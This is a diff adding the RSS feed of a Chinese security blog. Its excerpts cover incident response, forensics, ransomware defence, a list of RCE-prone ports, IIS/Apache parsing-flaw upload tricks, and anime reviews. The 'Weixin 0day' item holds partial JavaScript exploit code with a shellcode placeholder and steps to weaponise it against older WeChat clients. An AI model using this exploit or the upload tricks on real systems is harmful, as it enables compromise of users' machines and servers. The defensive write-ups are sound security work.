@@ -1,0 +1,270 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Posts on Olist.213</title>
+    <link>https://olist213.github.io/posts/</link>
+    <description>Recent content in Posts on Olist.213</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>zh-cn</language>
+    <lastBuildDate>Mon, 19 Apr 2021 15:28:47 +0800</lastBuildDate><atom:link href="https://olist213.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>vs2019编译masscan</title>
+      <link>https://olist213.github.io/posts/vs2019-build-masscan/</link>
+      <pubDate>Mon, 19 Apr 2021 15:28:47 +0800</pubDate>
+      
+      <guid>https://olist213.github.io/posts/vs2019-build-masscan/</guid>
+      <description>vs2019编译masscan 修改两处地方
+1、misc/string_s.h的58行改成如下代码
+_MSC_VER &amp;gt;= 1900 2、stubs/stub-lua.c改成如下代码：
+name = (void*(*)())GetProcAddress(lib, #name); \ if (name == NULL) fprintf(stderr, &amp;#34;liblua: %s: failed\n&amp;#34;, #name); </description>
+    </item>
+    
+    <item>
+      <title>Weixin 0day复现</title>
+      <link>https://olist213.github.io/posts/weixin-0day/</link>
+      <pubDate>Mon, 19 Apr 2021 11:29:04 +0800</pubDate>
+      
+      <guid>https://olist213.github.io/posts/weixin-0day/</guid>
+      <description>本文撰写人：netsetit
+前提：微信版本低于3.2（测试版本为3.0）
+1、生成一个shellcode，让js可以执行（注意：不要勾选x64，输出的文件为C）
+2、生成好shellcode，文本打开。
+3、对shellcode进行处理
+ 将生成的shellcode 引号前后的文件删除 将 &#39; \ &#39; (反斜杠)换成 ‘,0 ’ (英文逗号 和 0 )  4、将生成的shellcode添加到js文件内
+ENABLE_LOG = true; IN_WORKER = true; // run calc and hang in a loop var shellcode = [ #your shellcode ]; //shellcode替换成自己的（就是上面处理好的shellcode，直接把shellcode粘贴进来） 注意是x86的  function print(data) { } var not_optimised_out = 0; var target_function = (function (value) { if (value == 0xdecaf0) { not_optimised_out += 1; } not_optimised_out += 1; not_optimised_out |= 0xff; not_optimised_out *= 12; }); for (var i = 0; i &amp;lt; 0x10000; ++i) { target_function(i); } var g_array; var tDerivedNCount = 17 * 87481 - 8; var tDerivedNDepth = 19 * 19; function cb(flag) { if (flag == true) { return; } g_array = new Array(0); g_array[0] = 0x1dbabe * 2; return &amp;#39;c01db33f&amp;#39;; } function gc() { for (var i = 0; i &amp;lt; 0x10000; ++i) { new String(); } } function oobAccess() { var this_ = this; this.</description>
+    </item>
+    
+    <item>
+      <title>Easy_Rce_Ports</title>
+      <link>https://olist213.github.io/posts/easy_rce_ports/</link>
+      <pubDate>Sat, 17 Apr 2021 23:16:10 +0800</pubDate>
+      
+      <guid>https://olist213.github.io/posts/easy_rce_ports/</guid>
+      <description>易RCE的端口 Java RMI: 1090,1098,1099,4444,11099,47001,47002,10999,12721 WebLogic: 7000-7004,8000-8003,9000-9003,9503,7070,7071 JDWP: 45000,45001 JMX: 8686,9012,50500 GlassFish: 4848 JBoss: 11111,4444,4445，8080，8090，8083，8093 Cisco Smart Install: 4786 HP Data Protector: 5555,5556 IBM WebSphere:8880，9080，9090 Apache Hadoop:8088 Redis:6379 Docker:2375 #docker remote api漏洞 Apache Solr:8983 Zoho Manageengine Desktop:8383 Atlassian Crowd:4990 Portainer:9000 Hashicorp Consul:8500 Apache Spark:6066 Apache Tomcat:8009，8080 Apache Flink:8081 elasticsearch:9200,9300 zabbix:8069 ~持续更新~</description>
+    </item>
+    
+    <item>
+      <title>记一次取证分析1</title>
+      <link>https://olist213.github.io/posts/forensic_analysis_1/</link>
+      <pubDate>Fri, 15 Mar 2019 15:20:24 +0800</pubDate>
+      
+      <guid>https://olist213.github.io/posts/forensic_analysis_1/</guid>
+      <description>0x01 事件描述  这次更新两篇文章，都是关于服务器取证的，也是我工作中的实例，两次取证先有了第一次取证，获取了攻击者的信息，第二次进行跨省取证。（具体详情就不多说了）
+  最近攻击者落网了（境外回来），才想把这次取证再次分享出来。
+  某单位直接被攻击者打了50多G的流量。所以事先电信方面进行了地址筛选，选出了一批地址，开始进行排查。
+ 取证流程 直接去了地市电信IDC机房（期间历经各种流程），找到对应的服务器，服务器是台linux服务器 。
+1、通过netstat命令查看服务器状态，发现本地端口对外连接，对外异常ip为122.224.32.32，端口为6009。
+2、通过webshell漏洞扫描工具（hm）对/home目录下的文件进行扫描，发现异常木马文件，由于网站在2015年就不用了所以这个木马文件应该是之前留下的。
+3、webshell本地访问
+4、查看本地初始化程序，发现异常文件/etc/rc.d/rc.local，该异常文件首先建立一个local文件，之后将系统防火墙关闭，通过nohup命令隐藏/etc/udisks-daemon命令执行的结果，以便达到隐藏的目的。文件内容如下:
+5、发现了/etc/udisks-daemon异常文件之后，找到/etc/udisks-daemon文件，发现该文件的权限为777任意权限。
+6、进一步分析还发现存在另外一个文件udisks-daemon_xmit.ini。
+疑似用来进行端口的初始化操作。，内容如下：
+7、将病毒文件udisks-daemon拉取到本地进行分析，利用wireshark进行抓包分析，同样的，向外连接的ip地址为。
+8、通过strace对病毒文件进行信号跟踪，发现病毒的向外连接的地址为122.224.32.32，端口为6009。
+9、反编译分析
+10、结合互联网上（微步https://x.threatbook.cn）的威胁情报信息对122.224.32.32地址进行查询分析，已经有用户举报此IP地址存在远控（作为服务端控制肉鸡的行为）行为。
+11、对ip地址进行定位。
+0x03 结论 至此分析完成，这台服务器同样为肉鸡。
+ip:122.224.32.32（控制端）</description>
+    </item>
+    
+    <item>
+      <title>记一次linux下的应急响应</title>
+      <link>https://olist213.github.io/posts/emergency_response1/</link>
+      <pubDate>Wed, 06 Mar 2019 15:35:36 +0800</pubDate>
+      
+      <guid>https://olist213.github.io/posts/emergency_response1/</guid>
+      <description>0x01 事件描述
+某同事在某单位遇到一个linux主机运行不正常，疑似服务器被植入恶意代码，叫我这边看下，当时同事了解到，由于服务器业务出现问题，导致客户登陆服务器查看情况，对异常进程进行查杀之后，恢复正常，但之后该进程又会重新启动。
+要了服务器的登陆信息之后，开始进行排查。
+0x02 漏洞排查
+1、用户根目录发现一个异常文件。
+2、通过火绒进行查杀
+3、stat命令查看文件状态
+ Access : 文件最近一次被访问的时间 Modify: 文件内容最近一次被修改的时间 Change: 文件属性最近一次被改变的时间  4、存在异常账户
+5、在home目录下也发现一个异常文件tufei34。
+6、通过在线云沙箱(https://s.threatbook.cn)检测，发现为木马后门。
+7、利用utmpdump对该二进制文件提取可读内容，发现对外连接了许多异常ip。
+火绒杀毒软件扫描结果。
+8、通过top命令对进程进行排查，发现异常进程rvnshcqhiq，进程id为13987，通过对进程id进行分析，发现其对外连接到ip183.ip-178-32-145.eu，这个域名也为一个异常域名。
+9、lsof -p PID，查看进程的连接情况，该异常文件位于/usr/bin下
+10、将异常文件rvnshcqhiq下载下来，通过在线云沙箱(https://s.threatbook.cn)对这个木马进行进一步分析，发现其为Xorddos木马。
+11、使用pstree也可以看到异常文件进程
+12、利用strings /usr/bin/rvnshcqhiq对木马文件进行排查，发现该木马文件启动了计划任务，每三分钟执行一次。
+13、查看任务计划文件。
+14、同时在/usr/bin/目录下也发现其他的木马文件。
+15、查看自启动文件ls /etc/rc*
+0x03 使用clamav进行查杀
+使用clamav进行查杀的效果,clamscan -r /usr/bin
+对其中的一个/usr/bin/.ssh文件进行分析,发现大量异常ip。
+strings /usr/bin/.sshd | egrep &#39;[1-9]{1,3}\.[1-9]{1,3}\.&#39;
+利用clamav扫描/etc/目录下的文件。
+Mysql也为木马文件。
+对登录记录进行分析，登录成功的ip前两个分别为54.36.137.146和37.44.212.223，这两个ip都为境外ip。
+grep &amp;#39;Accepted&amp;#39; /var/log/secure | awk &amp;#39;{pirnt $11}&amp;#39; | sort | uniq -c | sorn -nr 0x04 解决建议
+  对服务器的异常文件进行清理，由于木马会自动生成，所以先把木马文件的权限关闭，然后删除开机自启动的木马程序和软链接，手动清除全部木马原始文件，同时，将恶意文件生成的计划任务清空。
+  安装 clamav 扫描并删除感染文件。</description>
+    </item>
+    
+    <item>
+      <title>Tips1</title>
+      <link>https://olist213.github.io/posts/tips1/</link>
+      <pubDate>Fri, 15 Feb 2019 10:03:34 +0800</pubDate>
+      
+      <guid>https://olist213.github.io/posts/tips1/</guid>
+      <description>一些想法 一直在追寻好用的工具，而忘记了工具只是辅助，最重要的还是怎么去写。
+做笔记：
+做笔记其实还是用markdown比较好，可视化方面做得非常不错，但如果能结合nextcloud的日历就好了，但nextcloud的markdown editor在编辑的时候会有各种问题，从而直接用nextcloud内置的markdown editor还是会有很多的问题。
+目前，我所用的markdown editor主要如下：
+1、印象笔记内带的markdown编辑器 2、马克飞象 3、typora 4、小书匠
+马克飞象之前所有的文档都是同步到印象笔记中，那时印象笔记不支持markdown，所以第三方开发出了马克飞象进行印象笔记markdown同步，在印象笔记打开不支持编辑。
+typora在windows上的口碑甚好，但无奈用的还是不习惯。
+小书匠功能多，但比较冗余，功能多了，反倒不好用了。
+学习久了，一直学习也不是办法，永远处在学习的阶段，而没有产出成功，当知识转换不成生产力的时候，就是无用的知识，所以最近也想加大自己的学习力度，尽量做好笔记，产生自己的想法，也许当写的够多的时候，自己对知识的理解也就可以更上一层楼了吧！
+最近接触了nextcloud之后，想很多东西都围绕nextcloud来进行，包括生活、工作方面，我觉得都是可以的。
+学习笔记结合日历（caldav）来进行记录，每天学习的东西通过日历来进行记录，每天学习的东西，所感想东西。在学完一个知识点之后，在进行所有的分类、归总，不断地去总结、复习，最终通过语言表达出来，达到精炼的地步，我想高手的学习过程是这样的吧！不断地复习，不断地复习，不断地复习&amp;hellip;。
+1、在学习和复习的过程中，总会有一个问题，就是你觉得内容过多，有些知识点似懂非懂，你看着看着就会感到非常的厌烦，从而就不想看了，就搁在那里了，后面也就没有时间看了，慢慢的也就不看了，也就忘记了。
+针对这个问题，还是得仔细去思考，一个一个知识点来学习，不能好高骛远。
+2、还有一个问题，就是知识的实践，尽量做到知行合一。
+也许这是对的 在学习的时候，感觉现在少了思考的时候，可以在每件事情上面，去谈谈自己的看法，一部电影、一件琐事、生活中的感想，其实都是可以写下来的，一方面，锻炼自己的文字功底，一方面生活方面的柴米油盐也是自己身边的故事，把故事记录下来，其实也对自己有好处。
+技术方面也是，看完一篇技术文章，学完一门技术，做笔记是很重要的一件事情，先做笔记，后开始自己思考，自己要怎么写出这种文章。
+想法是靠写出来的吧 很多时候，想写blog，但有的时候，总不清楚该从哪里开始写起，但我想，最大的问题就是自己对知识不是很熟悉导致的，你不了解，导致你写不出来，看了别人的文章，感觉总写的不错。
+以后还是现在自己熟悉的方面去写，在做什么事情的时候，做好笔记，去总结在学习过程中的问题。
+这样才是最好的方式，锻炼自己的写作能力。</description>
+    </item>
+    
+    <item>
+      <title>Gintama47</title>
+      <link>https://olist213.github.io/posts/gintama47/</link>
+      <pubDate>Thu, 14 Feb 2019 11:34:30 +0800</pubDate>
+      
+      <guid>https://olist213.github.io/posts/gintama47/</guid>
+      <description>银魂47 这集主要分成两段，前面一段银时被鬼压床了，熟悉的剧情，新八道出了就是剧目组拖时间，银时就各种吐槽。
+爱上银魂之前，看了前面的几集，也发现略显无聊，各种拖沓，但越看到后面，才发现，生活何尝不是这种无聊的节奏呢？怎么可能每天都轰轰烈烈。
+之后的就是正片，江户被花粉搞得每个人都因花粉过敏，银时他们也不例外。正当他们因为决定谁去买卫生纸打的火热的时候，发现隔壁有家新搬来的邻居，刚好，邻居过来送花了，邻居打开门的瞬间，银时他们都吓呆了，邻居自我介绍，叫屁怒吕，一脸凶相，之后，凯瑟琳传阅了街报过来，他们下一下传阅给屁怒吕，之后就是银时他们去屁怒吕家，上演的各种脑洞。
+所谓，人不可貌相，水不可斗量，银时道出了真理，第一印象才是最重要。
+在现实生活中，如何给别人留下深刻的第一印象其实很重要，如何让别人能记住你，这不仅是们艺术，更是一门学问。除了外貌之后，还有个人的行为举止都会给人不同的印象。
+具体别人怎么去看，还涉及到审美的问题，审美不同，产生的第一印象也是不一样的。</description>
+    </item>
+    
+    <item>
+      <title>网页篡改漏洞描述</title>
+      <link>https://olist213.github.io/posts/web_page_tampering/</link>
+      <pubDate>Thu, 14 Feb 2019 11:21:08 +0800</pubDate>
+      
+      <guid>https://olist213.github.io/posts/web_page_tampering/</guid>
+      <description>网页篡改 风险等级:高危漏洞描述
+针对网站程序漏洞，植入木马 (webshell、跨站脚本攻击)，篡改网页，添加黑链或者嵌入非本站信息，甚至是创建恶意网页，通常为博彩、私服篡改居多。
+漏洞危害
+网站已被恶意攻击者控制，浏览器提示非法网站，不予访问，对网站自身形象不利。
+解决建议
+1、对服务器进行木马查杀，看是否存在被恶意控制的脚本，对网站进行测试，发现应用存在的缺陷。
+2、删除恶意的篡改内容
+3、通过申诉，更新快照。
+4、部署网页防篡改保护系统
+5、通过在线7*24小时云平台进行挂马检测/网页木马检测/黑链检测，通过在线服务平台的挂马特征库（云监控平台自学习系统动态增加挂马特征），对网页的挂马 / 木马和页面特征进行分析，识别出挂马、木马和挂黑链等安全问题。
+6、服务器日常的运维过程中，定期通过杀毒软件对服务器进行扫描，定期更换服务器密码，定期删除过期的用户，及时更新操作系统的补丁。</description>
+    </item>
+    
+    <item>
+      <title>web漏洞描述与解决建议</title>
+      <link>https://olist213.github.io/posts/web_vulnerability_description/</link>
+      <pubDate>Fri, 25 Jan 2019 16:42:15 +0800</pubDate>
+      
+      <guid>https://olist213.github.io/posts/web_vulnerability_description/</guid>
+      <description>&lt;p&gt;[TOC]&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;内容均来自互联网，风险等级根据实际情况定义&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;通用建议&#34;&gt;通用建议&lt;/h2&gt;
+&lt;p&gt;1、建立和完善一套有效的安全管理制度，对网站的日常维护和使用进行规范。&lt;/p&gt;
+&lt;p&gt;2、定期对网站及应用系统进行全面安全检查，保障系统安全运行，如有条件，可聘请第三方专业安全服务公司协助进行。&lt;/p&gt;
+&lt;p&gt;3、定期对相关管理人员和技术人员进行安全培训，提高安全技术能力和实际操作能力。&lt;/p&gt;
+&lt;p&gt;4、采用专业的Web安全防护产品，可以在不修改网站本身的情况下对大多数的Web攻击起到有效的阻断作用。&lt;/p&gt;</description>
+    </item>
+    
+    <item>
+      <title>勒索病毒防护建议</title>
+      <link>https://olist213.github.io/posts/virus/</link>
+      <pubDate>Fri, 25 Jan 2019 16:23:39 +0800</pubDate>
+      
+      <guid>https://olist213.github.io/posts/virus/</guid>
+      <description>1、通过防火墙进行ip、端口的细粒化访问控制，部署防毒墙对病毒进行安全防护，建立日志审计系统，对服务器日志进行收集和分析，以便日后排查。
+2、服务器操作系统和内网办公电脑安装专业的终端安全防护软件，为主机提供端点防护和病毒检测清理功能。
+3、尽量关闭不必要的文件共享权限以及关闭不必要的端口，如：445,135,139,3389 等。
+4、服务器和内网办公电脑及时给主机打补丁 (永恒之蓝漏洞补丁)，修复相应的高危漏洞。
+5、RDP 远程服务器等连接尽量使用强密码，不要使用弱密码。
+6、不要点击来源不明的邮件附件，不从不明网站下载软件。
+7、不定时进行异地备份计算机中重要的数据和文件，万一中病毒可以进行恢复。
+8、加强信息管理人员的安全意识，教育用户识别有关社会工程学攻击的危险和标志，完善信息安全管理制度，保障在出现问题时，能及时登录安全设备，完善网络拓扑图。
+9、正确的实施网络分段和网络安全域的划分。
+10、完善单位完善应急预案，定期进行应急演练工作，做到防患于未然。</description>
+    </item>
+    
+    <item>
+      <title>解析漏洞总结</title>
+      <link>https://olist213.github.io/posts/parsing_vulnerability/</link>
+      <pubDate>Tue, 22 Jan 2019 10:21:18 +0800</pubDate>
+      
+      <guid>https://olist213.github.io/posts/parsing_vulnerability/</guid>
+      <description>当我们访问web服务器时，如：www.test.com/index.php文件时，向web服务器发出请求，访问php文件，php的解析器将php文件解析成静态文件，返回给浏览器供用户浏览。
+服务器解析漏洞就发生在浏览器向服务器上传文件时，服务器把攻击者恶意构造的文件进行解析，并返回给浏览器，从而达到上传恶意文件的目的。
+一、解析漏洞分类
+ 0x01 IIS5.x/6.0解析漏洞 IIS的解析方法有两种
+1、目录解析
+如果服务器上存在一个目录为xx.asp，那么在这个目录下的文件都会被解析成asp文件。
+2、文件解析
+通过菜刀进行连接即可连接成功。
+IIS6.0除了执行asp文件外，还可以执行如：asa、cer、cdx等文件后缀的文件。可结合目录解析漏洞进行利用。如：xxx.cer/xxx.jpg,xxx.asa;.jpg。
+0x02 apache解析漏洞  1、多种后缀
+apache对文件后缀的识别是从右往左进行解析，如：xxx.php.hcx.hts。会先判断右边的.hts后缀，发现这个后缀不正常，开始解析.hcx，最终解析到php文件，从而执行恶意文件。
+查看php的模块配置文件/etc/apache2/mods-available/php7.0.conf
+#从下面的FileMatch中可以看到&amp;#34;.+.ph(p[3457]?|t|tml)$&amp;#34;，$代表最后一个，说明php本身 #还是检测最后一个后缀的 。  &amp;lt;FilesMatch &amp;#34;.+.ph(p[3457]?|t|tml)$&amp;#34;&amp;gt; SetHandler application/x-httpd-php &amp;lt;/FilesMatch&amp;gt; &amp;lt;FilesMatch &amp;#34;.+.phps$&amp;#34;&amp;gt; SetHandler application/x-httpd-php-source # Deny access to raw php sources by default 	# To re-enable it&amp;#39;s recommended to enable access to the files 	# only in specific virtual host or directory 	Require all denied &amp;lt;/FilesMatch&amp;gt; Deny access to files without filename (e.</description>
+    </item>
+    
+    <item>
+      <title>记一次某医院勒索软件事件处理整理</title>
+      <link>https://olist213.github.io/posts/blackmail_virus/</link>
+      <pubDate>Mon, 21 Jan 2019 10:50:31 +0800</pubDate>
+      
+      <guid>https://olist213.github.io/posts/blackmail_virus/</guid>
+      <description>之前的旧文章，换了hugo之后，重新拉过来，就拉这一篇，其他的就算了。
+ 起因 2018年的某天，公司接到某医院的电话，医院的后台和终端机出现数据库异常报错情况。
+基于这种紧急情况，公司立马出动应急人员，赶到客户现场。
+到现场，初步了解情况之后，通过沟通以及对报错信息进行分析，后台报错如下:
+（你的数据库已被SQL RUSH Team锁死 发送5个比特币到这个地址 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (大小写一致) 之后把你的Oracle SID邮寄地址 sqlrush@mail.com 我们将让你知道如何解锁你的数据库 Hi buddy, your database was hacked by SQL RUSH Team, send 5 bitcoin to address 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (case sensitive), after that send your Oracle SID to mail address sqlrush@mail.com, we will let you know how to unlock your database.） 初步判断为Ransom_RUSHQL.A勒索病毒。这种病毒针对oracle数据库，通过一定的条件触发，并最终锁死数据库，从而引发数据库宕机。
+由于是生产库，所以我们最终需要做的就是处理掉病毒，对数据进行恢复。
+病毒如下：
+-- -- Copyright (c) 1988, 2011, Oracle and/or its affiliates. -- All rights reserved.</description>
+    </item>
+    
+    <item>
+      <title>Time 2019 01 15</title>
+      <link>https://olist213.github.io/posts/time-2019-01-15/</link>
+      <pubDate>Wed, 16 Jan 2019 13:18:20 +0800</pubDate>
+      
+      <guid>https://olist213.github.io/posts/time-2019-01-15/</guid>
+      <description>银魂45集
+定春突然变大了，一开始，神乐、新八、银时不明白情况，都找不到解决办法。
+定春变大之后，邻居开始恐慌了，纷纷说要赶走定春，神乐守护着定春，神乐也被邻居扔石头砸了，定春看到神乐被打一幕，突然变得异常恐怖，开始丧失自己的理智，谁也拉不住，拼命逃窜。
+定春一开始是神子，后来神庙倒闭，巫女就把定春放在了银魂门口，当时被神乐捡了回去，神乐和定春的感情自不必多讲。
+在众人的拼命努力之下，通过五星阵终于把定春制伏了。
+最后一幕，银时看着电视，电视里放着的就是这一幕，银时说，真是无聊的节目，全是马赛克，其实在银时的内心，更多的是开心。
+最后也来了一句，不懂礼仪的人，可是没有资格养宠物的哦。
+在现实生活中，又不是如此呢？连基本的礼仪都不懂的人，如何能善待自己养的宠物呢，记得，李敖先生说过，如果你真的喜欢宠物，你就需要和宠物同喝一杯水，不然，就算不上喜欢。
+同样的，回到人的身上，不同负责的人，可是没有资格养孩子的哦。鲁迅先生说过，孩子降临人世，你就要对其负责，如果不想负责，就不要把孩子带来世界，生命是可贵的，不要白白浪费了一个生命。</description>
+    </item>
+    
+    <item>
+      <title>Welcome</title>
+      <link>https://olist213.github.io/posts/welcome/</link>
+      <pubDate>Thu, 27 Dec 2018 11:48:12 +0800</pubDate>
+      
+      <guid>https://olist213.github.io/posts/welcome/</guid>
+      <description> 最近接触到hugo，进一步了解hugo，发现hugo的确比hexo好点，之前hexo要装载各种模块的时候，每次装起来都比较麻烦。特别是不同的版本升级的时候，问题一大推。
+  之前的网站就放在那了，也不想去更新了，自己也想重新开始，写点自己有意义的东西，算是一个新的开头。
+  写blog，还是要有自己的东西。
+ </description>
+    </item>
+    
+  </channel>
+</rss>
